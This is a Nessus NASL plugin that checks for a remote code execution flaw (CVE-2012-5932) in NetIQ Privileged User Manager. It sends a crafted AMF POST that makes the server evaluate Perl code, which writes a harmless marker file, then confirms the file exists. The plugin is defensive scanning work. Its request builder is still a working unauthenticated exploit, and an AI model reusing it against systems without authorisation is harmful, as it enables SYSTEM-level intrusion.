#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62992);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/05/11 13:32:18 $");

  script_cve_id("CVE-2012-5932");
  script_bugtraq_id(56539);
  script_osvdb_id(87334, 88754);
  script_xref(name:"EDB-ID", value:"22738");

  script_name(english:"NetIQ Privileged User Manager ldapagnt_eval() Function Remote Code Execution (intrusive check)");
  script_summary(english:"Tries to create a file on web server");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has a web application that is affected by a remote 
code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The NetIQ Privileged User Manager install hosted on the remote web
server contains a flaw that is triggered when an error occurs in the
'ldapagnt_eval()' function when parsing requests.  An unauthenticated
attacker could exploit this flaw to execute arbitrary code with SYSTEM
privileges. 

Nessus was able to exploit this vulnerability via a specially crafted 
POST request and create a remotely-accessible file on the web server.");
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/9sg_novell_netiq_ldapagnt_adv.htm");
  script_set_attribute(attribute:"see_also", value:"https://www.novell.com/support/kb/doc.php?id=7011385");
  script_set_attribute(attribute:"solution", value:"Apply NetIQ Privileged User Manager 2.3.1 HF2 (2.3.1-2) or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Novell NetIQ 2.3.1 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'NetIQ Privileged User Manager 2.3.1 ldapagnt_eval() Remote Perl Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"patch_publication_date",value:"2012/11/20");
  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:netiq:privileged_user_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("netiq_pum_detect.nasl");
  script_require_ports("Services/www", 80, 443);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/netiq_pum");

  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

# app runs on port 443 by default, but can be configured to run on port 80
port = get_http_port(default:443);

appname = "NetIQ Privileged User Manager";
kb_appname = "netiq_pum";

install = get_install_from_kb(appname:kb_appname, port:port, exit_on_fail:TRUE);
dir = install['dir'];

svc_str = get_kb_item_or_exit("www/"+port+"/"+kb_appname+"/svc_str");

filename = 'Nessus' + rand();
# perl script that will be executed with SYSTEM privs
code = 'system("echo Nessus was here - ' + SCRIPT_NAME + ' > ./service/local/admin/docs/' + filename + '");';

identity = "nessus"; # can be anything

# Try to execute perl script
# AMF encoded data
postdata =
  raw_string(0x00,0x00,0x00,0x00,0x00,0x01,
             0x00,0x14) + # len
  "SPF.Util.callModuleA" + 
  raw_string(0x00,0x00,0x00,0x00,0x02,0x0a,0x0a,0x00,0x00,0x00,0x01,
             0x03, # obj
             0x00,0x03) + # len
  "pkt" +
  raw_string(0x03, # obj
             0x00,0x06) + # len
  "method" +
  raw_string(0x02, # str
             0x00,0x04) + # len
  "eval" +
  raw_string(0x00,0x06) + # len
  "module" +
  raw_string(0x02, # str
             0x00,0x08) + # len
  "ldapagnt" +
  raw_string(0x00,0x04) + # len
  "Eval" +
  raw_string(0x03, # obj
             0x00,0x07) + # len
  "content" + 
  raw_string(0x02) + # str
  mkword(strlen(code) + 4) +
  code +
  raw_string(0x0a,0x0a,0x0a,0x0a, # \n\n\n\n
             0x00,0x00,0x09, # end obj
             0x00,0x00,0x09, # end obj
             0x00,0x03) + # len
  "uid" +
  raw_string(0x02) + # str
  mkword(strlen(identity)) + # len
  identity + 
  raw_string(0x00,0x00,0x09, # end obj
             0x00,0x08) + # len
  "svc_name" +
  raw_string(0x02) + # str
  mkword(strlen(svc_str)) + # len
  svc_str +
  raw_string(0x00,0x00,0x09); # end obj

res = http_send_recv3(
  method:'POST',
  item:dir + '/',
  port:port,
  add_headers:make_array(
    'Content-Type', 'application/x-amf', # required
    'x-flash-version', '11,4,402,278'
  ),
 data:postdata, 
  exit_on_fail:TRUE
);

# give file time to create...
sleep(2);

# check if file exist
res = http_send_recv3(
  method:'GET',
  item:dir + '/' + filename,
  port:port,
  exit_on_fail:TRUE
);

if ('Nessus was here' >< res[2])
{
  if (report_verbosity > 0)
  {
    report = '\nNessus was able to create the following file on the server : \n\n' +
    '  ' + build_url(qs:dir + '/' + filename, port:port) + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(qs:dir, port:port));
